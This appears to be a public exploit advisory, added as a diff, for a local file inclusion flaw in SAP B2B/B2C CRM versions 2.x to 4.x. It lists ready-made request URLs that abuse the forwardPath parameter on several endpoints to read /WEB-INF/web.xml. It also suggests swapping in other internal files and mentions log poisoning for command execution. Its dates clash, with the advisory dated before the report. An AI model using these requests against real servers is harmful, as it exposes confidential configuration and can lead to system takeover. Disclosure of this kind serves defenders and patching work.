@@ -1,0 +1,43 @@
+# Title: SAP B2B / B2C CRM 2.x < 4.x - Local File Inclusion
+# Application:SAP B2B OR B2C is CRM
+# Versions Affected: SAP B2B OR B2C is CRM 2.x 3.x and 4.x with Bakend R/3 (to icss_b2b)
+# Vendor URL: http://SAP.com
+# Bugs: SAP LFI in B2B OR B2C CRM
+# Sent:  2018-05-03
+# Reported:  2018-05-03
+# Date of Public Advisory: 2018-02-09
+# Reference: SAP Security Note 1870255656
+# Author: Richard Alviarez
+
+# 1. VULNERABLE PACKAGES
+# SAP LFI in B2B OR B2C CRM v2.x to 4.x
+# Other versions are probably affected too, but they were not checked.
+
+# 2. TECHNICAL DESCRIPTION
+# A possible attacker can take advantage of this vulnerability 
+# to obtain confidential information of the platform, 
+# as well as the possibility of writing in the logs of the
+# registry in order to get remote execution of commands and take control of the system.
+
+
+# 3. Steps to exploit this vulnerability
+
+A. Open
+https://SAP/{name}_b2b/initProductCatalog.do?forwardPath=/WEB-INF/web.xml
+
+Other vulnerable parameters:
+
+https://SAP/{name}_b2b/CatalogClean.do?forwardPath=/WEB-INF/web.xml
+https://SAP/{name}_b2b/IbaseSearchClean.do?forwardPath=/WEB-INF/web.xml
+https://SAP/{name}_b2b/ForwardDynamic.do?forwardPath=/WEB-INF/web.xml
+page on SAP server
+
+B. Change parameter {name} for example icss_b2b or other name....
+
+C. Change "/WEB-INF/web.xml" for other files or archives internal.
+
+
+# 4. Collaborators
+# - CuriositySec
+# - aDoN90
+# - Vis0r
